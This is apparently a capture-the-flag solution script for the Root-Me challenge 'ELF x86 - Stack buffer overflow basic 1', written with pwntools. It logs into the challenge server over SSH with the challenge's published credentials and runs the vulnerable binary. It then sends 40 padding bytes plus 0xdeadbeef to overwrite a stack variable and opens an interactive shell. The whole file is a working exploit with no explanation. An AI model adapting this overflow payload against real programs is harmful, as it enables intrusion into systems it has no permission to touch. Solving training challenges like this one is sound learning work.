# Root-Me: ELF x86 - Stack buffer overflow basic 1
# woanmeo11

from pwn import *

user = passwd = 'app-systeme-ch13'
r = ssh(host='challenge02.root-me.org', port=2222, user=user, password=passwd)
r = r.process('ch13')

payload = b'a'*40 + p32(0xdeadbeef)

r.sendline(payload)
r.interactive()
